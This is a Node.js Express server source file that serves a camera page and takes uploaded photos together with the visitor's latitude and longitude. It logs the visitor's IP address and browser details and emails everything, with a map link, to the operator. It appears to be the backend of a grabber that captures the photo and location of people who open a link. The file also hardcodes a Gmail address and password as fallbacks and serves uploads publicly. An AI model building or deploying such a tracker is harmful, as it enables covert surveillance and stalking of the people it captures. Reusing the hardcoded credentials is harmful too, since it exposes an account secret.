const express = require("express");
const multer = require("multer");
const cors = require("cors");
const path = require("path");
const nodemailer = require("nodemailer");
const fs = require("fs");

const app = express();
const PORT = process.env.PORT || 3000;
const uploadPath = "uploads/";

app.use(cors());
app.use(express.json());
app.use(express.static(uploadPath));

// Ensure uploads folder exists
if (!fs.existsSync(uploadPath)) {
  fs.mkdirSync(uploadPath);
}

// Multer storage setup
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, uploadPath),
  filename: (req, file, cb) =>
    cb(null, Date.now() + path.extname(file.originalname)),
});
const upload = multer({ storage });

// Gmail setup (Render Environment Variables)
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER || "ajaykumar155126@gmail.com",
    pass: process.env.EMAIL_PASS || "jrqc dupo xilq fbit",
  },
});

// 🔹 Serve camera.html when user opens root "/"
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "camera.html"));
});

// 🔹 Upload route (handles photo + Gmail)
app.post("/upload", upload.single("photo"), async (req, res) => {
  try {
    if (!req.file) return res.status(400).json({ error: "No file uploaded" });

    const backendUrl = 'https://backend-photo-loaction.onrender.com/upload';
    const photoURL = `${backendUrl}/${req.file.filename}`;

    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    const device = req.headers["user-agent"];
    const date = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
    const { lat, lon } = req.body;

    let locationInfo = "Location not available";
    if (lat && lon) {
      locationInfo = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
    }

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER,
      subject: "📸 New Photo Uploaded (Magic Capture Online)",
      html: `
        <h2>New Photo Uploaded 🎉</h2>
        <p><b>📅 Date & Time:</b> ${date}</p>
        <p><b>💻 Device Info:</b> ${device}</p>
        <p><b>🌍 Location:</b> <a href="${locationInfo}" target="_blank">${locationInfo}</a></p>
        <p><b>🌐 IP Address:</b> ${ip}</p>
        <p><b>🖼️ Uploaded Photo:</b> <a href="${photoURL}" target="_blank">View Photo</a></p>
      `,
    };

    await transporter.sendMail(mailOptions);
    console.log("✅ Email sent successfully!");
    res.json({
      message: "✅ Photo uploaded & email sent successfully!",
      filePath: photoURL,
    });
  } catch (error) {
    console.error("❌ Error:", error);
    res.status(500).json({ error: "Something went wrong", details: error.message });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`✅ Server running at http://localhost:${PORT}`);
});
